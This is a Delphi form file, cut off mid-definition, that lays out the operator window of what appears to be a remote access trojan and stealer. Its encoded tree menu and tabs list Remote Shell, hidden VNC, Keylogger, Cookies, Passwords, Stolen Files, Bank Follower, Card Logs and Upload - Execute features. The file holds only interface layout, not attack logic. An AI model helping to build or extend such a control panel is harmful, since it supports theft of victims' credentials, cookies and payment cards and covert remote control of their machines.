object RunExecute: TRunExecute
  Left = 0
  Top = 0
  AlphaBlend = True
  AlphaBlendValue = 250
  BorderStyle = bsNone
  Caption = 'RunExecute'
  ClientHeight = 393
  ClientWidth = 633
  Color = 2428680
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -12
  Font.Name = 'Segoe UI'
  Font.Style = []
  Position = poScreenCenter
  OnCreate = FormCreate
  TextHeight = 15
  object scGPPanel9: TscGPPanel
    Left = 0
    Top = 0
    Width = 633
    Height = 25
    FluentUIOpaque = False
    TabOrder = 0
    BlurBackground = False
    BlurBackgroundAmount = 5
    BackgroundStyle = gppbsColor
    ContentMarginLeft = 0
    ContentMarginRight = 0
    ContentMarginTop = 0
    ContentMarginBottom = 0
    CustomImageIndex = -1
    DragForm = True
    DragTopForm = True
    DrawTextMode = scdtmGDI
    FillGradientAngle = 90
    FillGradientBeginAlpha = 255
    FillGradientEndAlpha = 255
    FillGradientBeginColorOffset = 25
    FillGradientEndColorOffset = 25
    FrameWidth = 1
    FillColor = 2428680
    FillColorAlpha = 255
    FillColor2 = 2428680
    FrameColor = 5189155
    FrameColorAlpha = 255
    FrameRadius = 0
    ShowCaption = False
    CaptionGlowEffect.Enabled = False
    CaptionGlowEffect.Color = clBtnShadow
    CaptionGlowEffect.AlphaValue = 255
    CaptionGlowEffect.GlowSize = 7
    CaptionGlowEffect.Offset = 0
    CaptionGlowEffect.Intensive = True
    CaptionGlowEffect.StyleColors = True
    Color = clBtnFace
    Caption = 'scGPPanel2'
    TransparentBackground = True
    StorePaintBuffer = True
    Sizeable = False
    WallpaperIndex = -1
    WordWrap = False
    object Label1: TLabel
      Left = 3
      Top = 4
      Width = 42
      Height = 16
      Caption = 'Client'
      Font.Charset = DEFAULT_CHARSET
      Font.Color = 13017238
      Font.Height = -12
      Font.Name = 'JetBrains Mono'
      Font.Style = []
      ParentFont = False
    end
    object Label2: TLabel
      Left = 617
      Top = 4
      Width = 7
      Height = 16
      Caption = 'X'
      Font.Charset = DEFAULT_CHARSET
      Font.Color = 13017238
      Font.Height = -12
      Font.Name = 'JetBrains Mono'
      Font.Style = []
      ParentFont = False
      OnClick = Label2Click
    end
  end
  object scTreeView1: TscTreeView
    Left = 8
    Top = 40
    Width = 192
    Height = 352
    FluentUIOpaque = False
    BorderStyle = bsNone
    CheckBoxes = False
    Color = 2428680
    Font.Charset = DEFAULT_CHARSET
    Font.Color = 14968160
    Font.Height = -11
    Font.Name = 'JetBrains Mono'
    Font.Style = []
    Images = VirtualImageList1
    Indent = 19
    MultiSelect = True
    MultiSelectStyle = [msControlSelect, msShiftSelect]
    ParentFont = False
    ParentShowHint = False
    ShowHint = False
    SortType = stData
    TabOrder = 1
    Items.NodeData = {
      070700000009540054007200650065004E006F00640065003500000009000000
      0900000009000000FFFFFFFF09000000000000000002000000010B5300790073
      00740065006D00200049006E0066006F0000003D0000000A0000000A0000000A
      000000FFFFFFFF0A000000000000000000000000010F41006C006C0020004900
      6E0066006F0072006D006100740069006F006E00000041000000140000001400
      000014000000FFFFFFFF1400000000000000000000000001114D0069006E0069
      006E006700200043006F006D00700061007400690062006C00650000003F0000
      00150000001500000015000000FFFFFFFF150000000000000000020000000110
      530079007300740065006D002000460075006E006300740069006F006E007300
      00003D000000110000001100000011000000FFFFFFFF11000000000000000000
      000000010F500072006F00630065007300730020004D0061006E006100670065
      007200000037000000160000001600000016000000FFFFFFFF16000000000000
      000000000000010C520065006D006F007400650020005300680065006C006C00
      0000250000000F0000000F0000000F000000FFFFFFFF0F000000000000000003
      00000001035300700079000000270000001A0000001A0000001A000000FFFFFF
      FF1A0000000000000000000000000104480056004E0043000000310000001800
      00001800000018000000FFFFFFFF1800000000000000000000000001094B0065
      0079006C006F0067006700650072000000330000001B0000001B0000001B0000
      00FFFFFFFF1B000000000000000000000000010A530063007200650065006E00
      730068006F00740000002D0000001E0000001E0000001E000000FFFFFFFF1E00
      0000000000000003000000010753007400650061006C006500720000002D0000
      00030000000300000003000000FFFFFFFF030000000000000000000000000107
      43006F006F006B006900650073000000310000000B0000000B0000000B000000
      FFFFFFFF0B0000000000000000000000000109500061007300730077006F0072
      0064007300000039000000190000001900000019000000FFFFFFFF1900000000
      0000000000000000010D53007400650061006C00650064002000460069006C00
      650073000000390000001C0000001C0000001C000000FFFFFFFF1C0000000000
      00000001000000010D420061006E006B00200046006F006C006C006F00770065
      0072000000370000001D0000001D0000001D000000FFFFFFFF1D000000000000
      000000000000010C46006F006C006C006F0077002000420061006E006B007300
      0000310000000C0000000C0000000C000000FFFFFFFF0C000000000000000001
      0000000109430061007200640020004C006F006700730000002F0000000C0000
      000C0000000C000000FFFFFFFF0C000000000000000000000000010843004300
      2F004300610072006400730000003B000000130000001300000013000000FFFF
      FFFF13000000000000000001000000010E520065006D006F0074006500200045
      0078006500630075007400650000003F000000130000001300000013000000FF
      FFFFFF130000000000000000000000000110550070006C006F00610064002000
      2D0020004500780065006300750074006500}
    ButtonCollapseImageIndex = 0
    ButtonExpandImageIndex = 1
    SelectionStyle = scstColor
    SelectionColor = 16740972
    SelectionTextColor = clWhite
    ButtonColor = 14968160
    ButtonGlyphColor = clWhite
    ShowFocusRect = False
    DefaultDraw = False
    ButtonStyle = scebsButton
    OnClick = scTreeView1Click
  end
  object scGPPageControl1: TscGPPageControl
    Left = 205
    Top = 40
    Width = 420
    Height = 352
    Font.Charset = DEFAULT_CHARSET
    Font.Color = 2428680
    Font.Height = -12
    Font.Name = 'Segoe UI'
    Font.Style = []
    ParentFont = False
    FluentUIOpaque = False
    TabOrder = 2
    Color = 2428680
    DrawTextMode = scdtmGDI
    EnableDragReorderTabs = False
    TabsBGFillColor = 2428680
    TabsBGFillColorAlpha = 255
    TransparentBackground = False
    FrameWidth = 2
    FrameScaleWidth = False
    FrameColor = 2428680
    FrameColorAlpha = 255
    FrameBGFillColor = 2428680
    FrameBGFillColorAlpha = 255
    BorderStyle = scgpbsNone
    MouseWheelSupport = False
    ShowFocusRect = False
    ShowInActiveTab = False
    ShowCloseButtons = False
    ShowCloseButtonOnActiveTabOnly = False
    TabsLeftOffset = 15
    TabsRightOffset = 15
    TabsTopOffset = 0
    TabGlowEffect.Enabled = False
    TabGlowEffect.Color = clHighlight
    TabGlowEffect.AlphaValue = 255
    TabGlowEffect.GlowSize = 7
    TabGlowEffect.Offset = 0
    TabGlowEffect.Intensive = True
    TabGlowEffect.StyleColors = True
    TabGlowEffect.HotColor = clNone
    TabGlowEffect.PressedColor = clNone
    TabGlowEffect.FocusedColor = clNone
    TabGlowEffect.PressedGlowSize = 7
    TabGlowEffect.PressedAlphaValue = 255
    TabGlowEffect.States = [scsFocused]
    TabOptions.NormalColor = 2428680
    TabOptions.ActiveColor = 2428680
    TabOptions.MouseInColor = 2428680
    TabOptions.FocusedColor = 2428680
    TabOptions.NormalColorAlpha = 70
    TabOptions.ActiveColorAlpha = 230
    TabOptions.MouseInColorAlpha = 40
    TabOptions.FocusedColorAlpha = 255
    TabOptions.FrameNormalColor = 2428680
    TabOptions.FrameActiveColor = 2428680
    TabOptions.FrameMouseInColor = 2428680
    TabOptions.FrameFocusedColor = 2428680
    TabOptions.FrameWidth = 2
    TabOptions.FrameNormalColorAlpha = 50
    TabOptions.FrameActiveColorAlpha = 80
    TabOptions.FrameMouseInColorAlpha = 60
    TabOptions.FrameFocusedColorAlpha = 80
    TabOptions.FontNormalColor = 2428680
    TabOptions.FontActiveColor = 2428680
    TabOptions.FontMouseInColor = 2428680
    TabOptions.FontFocusedColor = 2428680
    TabOptions.TabStyle = gptsShape
    TabOptions.LineWidth = 0
    TabOptions.ShapeFillGradientAngle = 90
    TabOptions.GradientColorOffset = 30
    TabOptions.ShapeCornerRadius = 5
    TabOptions.StyleColors = True
    TabCloseButtonOptions.NormalColor = clBtnText
    TabCloseButtonOptions.HotColor = clRed
    TabCloseButtonOptions.PressedColor = clRed
    TabCloseButtonOptions.DisabledColor = clBtnText
    TabCloseButtonOptions.NormalColorAlpha = 0
    TabCloseButtonOptions.HotColorAlpha = 220
    TabCloseButtonOptions.PressedColorAlpha = 200
    TabCloseButtonOptions.DisabledColorAlpha = 0
    TabCloseButtonOptions.GlyphNormalColor = clBtnText
    TabCloseButtonOptions.GlyphHotColor = clWhite
    TabCloseButtonOptions.GlyphPressedColor = clWhite
    TabCloseButtonOptions.GlyphDisabledColor = clBtnText
    TabCloseButtonOptions.GlyphNormalColorAlpha = 200
    TabCloseButtonOptions.GlyphHotColorAlpha = 255
    TabCloseButtonOptions.GlyphPressedColorAlpha = 200
    TabCloseButtonOptions.GlyphDisabledColorAlpha = 100
    TabCloseButtonOptions.ShapeKind = scgptcbRounded
    TabCloseButtonOptions.StyleColros = True
    TabSpacing = 10
    TabMargin = 10
    TabWidth = 0
    ScrollButtonWidth = 20
    ScrollButtonArrowColor = 2428680
    ScrollButtonArrowThickness = 2
    ScrollButtonColor = 2428680
    ScrollButtonTransparent = True
    TabHeight = 30
    Tabs = <
      item
        Page = AllInformation
        Visible = True
        Enabled = True
        ImageIndex = -1
        Caption = 'TscGPPageControlTab3'
        CustomOptions.NormalColor = 2428680
        CustomOptions.ActiveColor = 2428680
        CustomOptions.MouseInColor = 2428680
        CustomOptions.FocusedColor = 2428680
        CustomOptions.NormalColorAlpha = 255
        CustomOptions.ActiveColorAlpha = 255
        CustomOptions.MouseInColorAlpha = 255
        CustomOptions.FocusedColorAlpha = 255
        CustomOptions.FrameNormalColor = 2428680
        CustomOptions.FrameActiveColor = 2428680
        CustomOptions.FrameMouseInColor = 2428680
        CustomOptions.FrameFocusedColor = 2428680
        CustomOptions.FrameWidth = 2
        CustomOptions.FrameNormalColorAlpha = 255
        CustomOptions.FrameActiveColorAlpha = 255
        CustomOptions.FrameMouseInColorAlpha = 255
        CustomOptions.FrameFocusedColorAlpha = 255
        CustomOptions.FontNormalColor = 2428680
        CustomOptions.FontActiveColor = 2428680
        CustomOptions.FontMouseInColor = 2428680
        CustomOptions.FontFocusedColor = 2428680
        CustomOptions.TabStyle = gptsShape
        CustomOptions.LineWidth = 0
        CustomOptions.ShapeFillGradientAngle = 255
        CustomOptions.GradientColorOffset = 30
        CustomOptions.ShapeCornerRadius = 5
        CustomOptions.StyleColors = True
        CustomGlowEffect.Enabled = False
        CustomGlowEffect.Color = clHighlight
        CustomGlowEffect.AlphaValue = 255
        CustomGlowEffect.GlowSize = 7
        CustomGlowEffect.Offset = 0
        CustomGlowEffect.Intensive = True
        CustomGlowEffect.StyleColors = True
        CustomGlowEffect.HotColor = clNone
        CustomGlowEffect.PressedColor = clNone
        CustomGlowEffect.FocusedColor = clNone
        CustomGlowEffect.PressedGlowSize = 7
        CustomGlowEffect.PressedAlphaValue = 255
        CustomGlowEffect.States = [scsFocused]
        CustomFrameColor = 2428680
        CustomFrameColorAlpha = 255
        ShowCloseButton = True
        UseCustomOptions = True
      end
      item
        Page = CPU
        Visible = True
        Enabled = True
        ImageIndex = -1
        Caption = 'TscGPPageControlTab2'
        CustomOptions.NormalColor = clBtnShadow
        CustomOptions.ActiveColor = clBtnFace
        CustomOptions.MouseInColor = clBtnShadow
        CustomOptions.FocusedColor = clBtnFace
        CustomOptions.NormalColorAlpha = 70
        CustomOptions.ActiveColorAlpha = 230
        CustomOptions.MouseInColorAlpha = 40
        CustomOptions.FocusedColorAlpha = 255
        CustomOptions.FrameNormalColor = clBtnText
        CustomOptions.FrameActiveColor = clBtnText
        CustomOptions.FrameMouseInColor = clBtnText
        CustomOptions.FrameFocusedColor = clBtnText
        CustomOptions.FrameWidth = 2
        CustomOptions.FrameNormalColorAlpha = 50
        CustomOptions.FrameActiveColorAlpha = 80
        CustomOptions.FrameMouseInColorAlpha = 60
        CustomOptions.FrameFocusedColorAlpha = 80
        CustomOptions.FontNormalColor = clBtnText
        CustomOptions.FontActiveColor = clBtnText
        CustomOptions.FontMouseInColor = clBtnText
        CustomOptions.FontFocusedColor = clBtnText
        CustomOptions.TabStyle = gptsShape
        CustomOptions.LineWidth = 0
        CustomOptions.ShapeFillGradientAngle = 90
        CustomOptions.GradientColorOffset = 30
        CustomOptions.ShapeCornerRadius = 5
        CustomOptions.StyleColors = True
        CustomGlowEffect.Enabled = False
        CustomGlowEffect.Color = clHighlight
        CustomGlowEffect.AlphaValue = 255
        CustomGlowEffect.GlowSize = 7
        CustomGlowEffect.Offset = 0
        CustomGlowEffect.Intensive = True
        CustomGlowEffect.StyleColors = True
        CustomGlowEffect.HotColor = clNone
        CustomGlowEffect.PressedColor = clNone
        CustomGlowEffect.FocusedColor = clNone
        CustomGlowEffect.PressedGlowSize = 7
        CustomGlowEffect.PressedAlphaValue = 255
        CustomGlowEffect.States = [scsFocused]
        CustomFrameColor = clNone
        CustomFrameColorAlpha = 255
        ShowCloseButton = True
        UseCustomOptions = False
      end
      item
        Page = GPU
        Visible = True
        Enabled = True
        ImageIndex = -1
        Caption = 'TscGPPageControlTab3'
        CustomOptions.NormalColor = clBtnShadow
        CustomOptions.ActiveColor = clBtnFace
        CustomOptions.MouseInColor = clBtnShadow
        CustomOptions.FocusedColor = clBtnFace
        CustomOptions.NormalColorAlpha = 70
        CustomOptions.ActiveColorAlpha = 230
        CustomOptions.MouseInColorAlpha = 40
        CustomOptions.FocusedColorAlpha = 255
        CustomOptions.FrameNormalColor = clBtnText
        CustomOptions.FrameActiveColor = clBtnText
        CustomOptions.FrameMouseInColor = clBtnText
        CustomOptions.FrameFocusedColor = clBtnText
        CustomOptions.FrameWidth = 2
        CustomOptions.FrameNormalColorAlpha = 50
        CustomOptions.FrameActiveColorAlpha = 80
        CustomOptions.FrameMouseInColorAlpha = 60
        CustomOptions.FrameFocusedColorAlpha = 80
        CustomOptions.FontNormalColor = clBtnText
        CustomOptions.FontActiveColor = clBtnText
        CustomOptions.FontMouseInColor = clBtnText
        CustomOptions.FontFocusedColor = clBtnText
        CustomOptions.TabStyle = gptsShape
        CustomOptions.LineWidth = 0
        CustomOptions.ShapeFillGradientAngle = 90
        CustomOptions.GradientColorOffset = 30
        CustomOptions.ShapeCornerRadius = 5
        CustomOptions.StyleColors = True
        CustomGlowEffect.Enabled = False
        CustomGlowEffect.Color = clHighlight
        CustomGlowEffect.AlphaValue = 255
        CustomGlowEffect.GlowSize = 7
        CustomGlowEffect.Offset = 0
        CustomGlowEffect.Intensive = True
        CustomGlowEffect.StyleColors = True
        CustomGlowEffect.HotColor = clNone
        CustomGlowEffect.PressedColor = clNone
        CustomGlowEffect.FocusedColor = clNone
        CustomGlowEffect.PressedGlowSize = 7
        CustomGlowEffect.PressedAlphaValue = 255
        CustomGlowEffect.States = [scsFocused]
        CustomFrameColor = clNone
        CustomFrameColorAlpha = 255
        ShowCloseButton = True
        UseCustomOptions = False
      end
      item
        Page = ProcessManager
        Visible = True
        Enabled = True
        ImageIndex = -1
        Caption = 'TscGPPageControlTab4'
        CustomOptions.NormalColor = clBtnShadow
        CustomOptions.ActiveColor = clBtnFace
        CustomOptions.MouseInColor = clBtnShadow
        CustomOptions.FocusedColor = clBtnFace
        CustomOptions.NormalColorAlpha = 70
        CustomOptions.ActiveColorAlpha = 230
        CustomOptions.MouseInColorAlpha = 40
        CustomOptions.FocusedColorAlpha = 255
        CustomOptions.FrameNormalColor = clBtnText
        CustomOptions.FrameActiveColor = clBtnText
        CustomOptions.FrameMouseInColor = clBtnText
        CustomOptions.FrameFocusedColor = clBtnText
        CustomOptions.FrameWidth = 2
        CustomOptions.FrameNormalColorAlpha = 50
        CustomOptions.FrameActiveColorAlpha = 80
        CustomOptions.FrameMouseInColorAlpha = 60
        CustomOptions.FrameFocusedColorAlpha = 80
        CustomOptions.FontNormalColor = clBtnText
        CustomOptions.FontActiveColor = clBtnText
        CustomOptions.FontMouseInColor = clBtnText
        CustomOptions.FontFocusedColor = clBtnText
        CustomOptions.TabStyle = gptsShape
        CustomOptions.LineWidth = 0
        CustomOptions.ShapeFillGradientAngle = 90
        CustomOptions.GradientColorOffset = 30
        CustomOptions.ShapeCornerRadius = 5
        CustomOptions.StyleColors = True
        CustomGlowEffect.Enabled = False
        CustomGlowEffect.Color = clHighlight
        CustomGlowEffect.AlphaValue = 255
        CustomGlowEffect.GlowSize = 7
        CustomGlowEffect.Offset = 0
        CustomGlowEffect.Intensive = True
        CustomGlowEffect.StyleColors = True
        CustomGlowEffect.HotColor = clNone
        CustomGlowEffect.PressedColor = clNone
        CustomGlowEffect.FocusedColor = clNone
        CustomGlowEffect.PressedGlowSize = 7
        CustomGlowEffect.PressedAlphaValue = 255
        CustomGlowEffect.States = [scsFocused]
        CustomFrameColor = clNone
        CustomFrameColorAlpha = 255
        ShowCloseButton = True
        UseCustomOptions = False
      end
      item
        Page = RemoteShell
        Visible = True
        Enabled = True
        ImageIndex = -1
        Caption = 'TscGPPageControlTab5'
        CustomOptions.NormalColor = clBtnShadow
        CustomOptions.ActiveColor = clBtnFace
        CustomOptions.MouseInColor = clBtnShadow
        CustomOptions.FocusedColor = clBtnFace
        CustomOptions.NormalColorAlpha = 70
        CustomOptions.ActiveColorAlpha = 230
        CustomOptions.MouseInColorAlpha = 40
        CustomOptions.FocusedColorAlpha = 255
        CustomOptions.FrameNormalColor = clBtnText
        CustomOptions.FrameActiveColor = clBtnText
        CustomOptions.FrameMouseInColor = clBtnText
        CustomOptions.FrameFocusedColor = clBtnText
        CustomOptions.FrameWidth = 2
        CustomOptions.FrameNormalColorAlpha = 50
        CustomOptions.FrameActiveColorAlpha = 80
        CustomOptions.FrameMouseInColorAlpha = 60
        CustomOptions.FrameFocusedColorAlpha = 80
        CustomOptions.FontNormalColor = clBtnText
        CustomOptions.FontActiveColor = clBtnText
        CustomOptions.FontMouseInColor = clBtnText
        CustomOptions.FontFocusedColor = clBtnText
        CustomOptions.TabStyle = gptsShape
        CustomOptions.LineWidth = 0
        CustomOptions.ShapeFillGradientAngle = 90
        CustomOptions.GradientColorOffset = 30
        CustomOptions.ShapeCornerRadius = 5
        CustomOptions.StyleColors = True
        CustomGlowEffect.Enabled = False
        CustomGlowEffect.Color = clHighlight
        CustomGlowEffect.AlphaValue = 255
        CustomGlowEffect.GlowSize = 7
        CustomGlowEffect.Offset = 0
        CustomGlowEffect.Intensive = True
        CustomGlowEffect.StyleColors = True
        CustomGlowEffect.HotColor = clNone
        CustomGlowEffect.PressedColor = clNone
        CustomGlowEffect.FocusedColor = clNone
        CustomGlowEffect.PressedGlowSize = 7
        CustomGlowEffect.PressedAlphaValue = 255
        CustomGlowEffect.States = [scsFocused]
        CustomFrameColor = clNone
        CustomFrameColorAlpha = 255
        ShowCloseButton = True
        UseCustomOptions = False
      end
      item
        Page = HVNC
        Visible = True
        Enabled = True
        ImageIndex = -1
        Caption = 'TscGPPageControlTab6'
        CustomOptions.NormalColor = clBtnShadow
        CustomOptions.ActiveColor = clBtnFace
        CustomOptions.MouseInColor = clBtnShadow
        CustomOptions.FocusedColor = clBtnFace
        CustomOptions.NormalColorAlpha = 70
        CustomOptions.ActiveColorAlpha = 230
        CustomOptions.MouseInColorAlpha = 40
        CustomOptions.FocusedColorAlpha = 255
        CustomOptions.FrameNormalColor = clBtnText
        CustomOptions.FrameActiveColor = clBtnText
        CustomOptions.FrameMouseInColor = clBtnText
        CustomOptions.FrameFocusedColor = clBtnText
        CustomOptions.FrameWidth = 2
        CustomOptions.FrameNormalColorAlpha = 50
        CustomOptions.FrameActiveColorAlpha = 80
        CustomOptions.FrameMouseInColorAlpha = 60
        CustomOptions.FrameFocusedColorAlpha = 80
        CustomOptions.FontNormalColor = clBtnText
        CustomOptions.FontActiveColor = clBtnText
        CustomOptions.FontMouseInColor = clBtnText
        CustomOptions.FontFocusedColor = clBtnText
        CustomOptions.TabStyle = gptsShape
        CustomOptions.LineWidth = 0
        CustomOptions.ShapeFillGradientAngle = 90
        CustomOptions.GradientColorOffset = 30
        CustomOptions.ShapeCornerRadius = 5
        CustomOptions.StyleColors = True
        CustomGlowEffect.Enabled = False
        CustomGlowEffect.Color = clHighlight
        CustomGlowEffect.AlphaValue = 255
        CustomGlowEffect.GlowSize = 7
        CustomGlowEffect.Offset = 0
        CustomGlowEffect.Intensive = True
        CustomGlowEffect.StyleColors = True
        CustomGlowEffect.HotColor = clNone
        CustomGlowEffect.PressedColor = clNone
        CustomGlowEffect.FocusedColor = clNone
        CustomGlowEffect.PressedGlowSize = 7
        CustomGlowEffect.PressedAlphaValue = 255
        CustomGlowEffect.States = [scsFocused]
        CustomFrameColor = clNone
        CustomFrameColorAlpha = 255
        ShowCloseButton = True
        UseCustomOptions = False
      end
      item
        Page = Keylogger
        Visible = True
        Enabled = True
        ImageIndex = -1
        Caption = 'TscGPPageControlTab7'
        CustomOptions.NormalColor = clBtnShadow
        CustomOptions.ActiveColor = clBtnFace
        CustomOptions.MouseInColor = clBtnShadow
        CustomOptions.FocusedColor = clBtnFace
        CustomOptions.NormalColorAlpha = 70
        CustomOptions.ActiveColorAlpha = 230
        CustomOptions.MouseInColorAlpha = 40
        CustomOptions.FocusedColorAlpha = 255
        CustomOptions.FrameNormalColor = clBtnText
        CustomOptions.FrameActiveColor = clBtnText
        CustomOptions.FrameMouseInColor = clBtnText
        CustomOptions.FrameFocusedColor = clBtnText
        CustomOptions.FrameWidth = 2
        CustomOptions.FrameNormalColorAlpha = 50
        CustomOptions.FrameActiveColorAlpha = 80
        CustomOptions.FrameMouseInColorAlpha = 60
        CustomOptions.FrameFocusedColorAlpha = 80
        CustomOptions.FontNormalColor = clBtnText
        CustomOptions.FontActiveColor = clBtnText
        CustomOptions.FontMouseInColor = clBtnText
        CustomOptions.FontFocusedColor = clBtnText
        CustomOptions.TabStyle = gptsShape
        CustomOptions.LineWidth = 0
        CustomOptions.ShapeFillGradientAngle = 90
        CustomOptions.GradientColorOffset = 30
        CustomOptions.ShapeCornerRadius = 5
        CustomOptions.StyleColors = True
        CustomGlowEffect.Enabled = False
        CustomGlowEffect.Color = clHighlight
        CustomGlowEffect.AlphaValue = 255
        CustomGlowEffect.GlowSize = 7
        CustomGlowEffect.Offset = 0
        CustomGlowEffect.Intensive = True
        CustomGlowEffect.StyleColors = True
        CustomGlowEffect.HotColor = clNone
        CustomGlowEffect.PressedColor = clNone
        CustomGlowEffect.FocusedColor = clNone
        CustomGlowEffect.PressedGlowSize = 7
        CustomGlowEffect.PressedAlphaValue = 255
        CustomGlowEffect.States = [scsFocused]
        CustomFrameColor = clNone
        CustomFrameColorAlpha = 255
        ShowCloseButton = True
        UseCustomOptions = False
      end
      item
        Page = Screenshot
        Visible = True
        Enabled = True
        ImageIndex = -1
        Caption = 'TscGPPageControlTab8'
        CustomOptions.NormalColor = clBtnShadow
        CustomOptions.ActiveColor = clBtnFace
        CustomOptions.MouseInColor = clBtnShadow
        CustomOptions.FocusedColor = clBtnFace
        CustomOptions.NormalColorAlpha = 70
        CustomOptions.ActiveColorAlpha = 230
        CustomOptions.MouseInColorAlpha = 40
        CustomOptions.FocusedColorAlpha = 255
        CustomOptions.FrameNormalColor = clBtnText
        CustomOptions.FrameActiveColor = clBtnText
        CustomOptions.FrameMouseInColor = clBtnText
        CustomOptions.FrameFocusedColor = clBtnText
        CustomOptions.FrameWidth = 2
        CustomOptions.FrameNormalColorAlpha = 50
        CustomOptions.FrameActiveColorAlpha = 80
        CustomOptions.FrameMouseInColorAlpha = 60
        CustomOptions.FrameFocusedColorAlpha = 80
        CustomOptions.FontNormalColor = clBtnText
        CustomOptions.FontActiveColor = clBtnText
        CustomOptions.FontMouseInColor = clBtnText
        CustomOptions.FontFocusedColor = clBtnText
        CustomOptions.TabStyle = gptsShape
        CustomOptions.LineWidth = 0
        CustomOptions.ShapeFillGradientAngle = 90
        CustomOptions.GradientColorOffset = 30
        CustomOptions.ShapeCornerRadius = 5
        CustomOptions.StyleColors = True
        CustomGlowEffect.Enabled = False
        CustomGlowEffect.Color = clHighlight
        CustomGlowEffect.AlphaValue = 255
        CustomGlowEffect.GlowSize = 7
        CustomGlowEffect.Offset = 0
        CustomGlowEffect.Intensive = True
        CustomGlowEffect.StyleColors = True
        CustomGlowEffect.HotColor = clNone
        CustomGlowEffect.PressedColor = clNone
        CustomGlowEffect.FocusedColor = clNone
        CustomGlowEffect.PressedGlowSize = 7
        CustomGlowEffect.PressedAlphaValue = 255
        CustomGlowEffect.States = [scsFocused]
        CustomFrameColor = clNone
        CustomFrameColorAlpha = 255
        ShowCloseButton = True
        UseCustomOptions = False
      end
      item
        Page = Cookies
        Visible = True
        Enabled = True
        ImageIndex = -1
        Caption = 'TscGPPageControlTab9'
        CustomOptions.NormalColor = clBtnShadow
        CustomOptions.ActiveColor = clBtnFace
        CustomOptions.MouseInColor = clBtnShadow
        CustomOptions.FocusedColor = clBtnFace
        CustomOptions.NormalColorAlpha = 70
        CustomOptions.ActiveColorAlpha = 230
        CustomOptions.MouseInColorAlpha = 40
        CustomOptions.FocusedColorAlpha = 255
        CustomOptions.FrameNormalColor = clBtnText
        CustomOptions.FrameActiveColor = clBtnText
        CustomOptions.FrameMouseInColor = clBtnText
        CustomOptions.FrameFocusedColor = clBtnText
        CustomOptions.FrameWidth = 2
        CustomOptions.FrameNormalColorAlpha = 50
        CustomOptions.FrameActiveColorAlpha = 80
        CustomOptions.FrameMouseInColorAlpha = 60
        CustomOptions.FrameFocusedColorAlpha = 80
        CustomOptions.FontNormalColor = clBtnText
        CustomOptions.FontActiveColor = clBtnText
        CustomOptions.FontMouseInColor = clBtnText
        CustomOptions.FontFocusedColor = clBtnText
        CustomOptions.TabStyle = gptsShape
        CustomOptions.LineWidth = 0
        CustomOptions.ShapeFillGradientAngle = 90
        CustomOptions.GradientColorOffset = 30
        CustomOptions.ShapeCornerRadius = 5
        CustomOptions.StyleColors = True
        CustomGlowEffect.Enabled = False
        CustomGlowEffect.Color = clHighlight
        CustomGlowEffect.AlphaValue = 255
        CustomGlowEffect.GlowSize = 7
        CustomGlowEffect.Offset = 0
        CustomGlowEffect.Intensive = True
        CustomGlowEffect.StyleColors = True
        CustomGlowEffect.HotColor = clNone
        CustomGlowEffect.PressedColor = clNone
        CustomGlowEffect.FocusedColor = clNone
        CustomGlowEffect.PressedGlowSize = 7
        CustomGlowEffect.PressedAlphaValue = 255
        CustomGlowEffect.States = [scsFocused]
        CustomFrameColor = clNone
        CustomFrameColorAlpha = 255
        ShowCloseButton = True
        UseCustomOptions = False
      end
      item
        Page = Passwords
        Visible = True
        Enabled = True
        ImageIndex = -1
        Caption = 'TscGPPageControlTab10'
        CustomOptions.NormalColor = clBtnShadow
        CustomOptions.ActiveColor = clBtnFace
        CustomOptions.MouseInColor = clBtnShadow
        CustomOptions.FocusedColor = clBtnFace
        CustomOptions.NormalColorAlpha = 70
        CustomOptions.ActiveColorAlpha = 230
        CustomOptions.MouseInColorAlpha = 40
        CustomOptions.FocusedColorAlpha = 255
        CustomOptions.FrameNormalColor = clBtnText
        CustomOptions.FrameActiveColor = clBtnText
        CustomOptions.FrameMouseInColor = clBtnText
        CustomOptions.FrameFocusedColor = clBtnText
        CustomOptions.FrameWidth = 2
        CustomOptions.FrameNormalColorAlpha = 50
        CustomOptions.FrameActiveColorAlpha = 80
        CustomOptions.FrameMouseInColorAlpha = 60
        CustomOptions.FrameFocusedColorAlpha = 80
        CustomOptions.FontNormalColor = clBtnText
        CustomOptions.FontActiveColor = clBtnText
        CustomOptions.FontMouseInColor = clBtnText
        CustomOptions.FontFocusedColor = clBtnText
        CustomOptions.TabStyle = gptsShape
        CustomOptions.LineWidth = 0
        CustomOptions.ShapeFillGradientAngle = 90
        CustomOptions.GradientColorOffset = 30
        CustomOptions.ShapeCornerRadius = 5
        CustomOptions.StyleColors = True
        CustomGlowEffect.Enabled = False
        CustomGlowEffect.Color = clHighlight
        CustomGlowEffect.AlphaValue = 255
        CustomGlowEffect.GlowSize = 7
        CustomGlowEffect.Offset = 0
        CustomGlowEffect.Intensive = True
        CustomGlowEffect.StyleColors = True
        CustomGlowEffect.HotColor = clNone
        CustomGlowEffect.PressedColor = clNone
        CustomGlowEffect.FocusedColor = clNone
        CustomGlowEffect.PressedGlowSize = 7
        CustomGlowEffect.PressedAlphaValue = 255
        CustomGlowEffect.States = [scsFocused]
        CustomFrameColor = clNone
        CustomFrameColorAlpha = 255
        ShowCloseButton = True
        UseCustomOptions = False
      end
      item
        Page = StealedFiles
        Visible = True
        Enabled = True
        ImageIndex = -1
        Caption = 'TscGPPageControlTab11'
        CustomOptions.NormalColor = clBtnShadow
        CustomOptions.ActiveColor = clBtnFace
        CustomOptions.MouseInColor = clBtnShadow
        CustomOptions.FocusedColor = clBtnFace
        CustomOptions.NormalColorAlpha = 70
        CustomOptions.ActiveColorAlpha = 230
        CustomOptions.MouseInColorAlpha = 40
        CustomOptions.FocusedColorAlpha = 255
        CustomOptions.FrameNormalColor = clBtnText
        CustomOptions.FrameActiveColor = clBtnText
        CustomOptions.FrameMouseInColor = clBtnText
        CustomOptions.FrameFocusedColor = clBtnText
        CustomOptions.FrameWidth = 2
        CustomOptions.FrameNormalColorAlpha = 50
        CustomOptions.FrameActiveColorAlpha = 80
        CustomOptions.FrameMouseInColorAlpha = 60
        CustomOptions.FrameFocusedColorAlpha = 80
        CustomOptions.FontNormalColor = clBtnText
        CustomOptions.FontActiveColor = clBtnText
        CustomOptions.FontMouseInColor = clBtnText
        CustomOptions.FontFocusedColor = clBtnText
        CustomOptions.TabStyle = gptsShape
        CustomOptions.LineWidth = 0
        CustomOptions.ShapeFillGradientAngle = 90
        CustomOptions.GradientColorOffset = 30
        CustomOptions.ShapeCornerRadius = 5
        CustomOptions.StyleColors = True
        CustomGlowEffect.Enabled = False
        CustomGlowEffect.Color = clHighlight
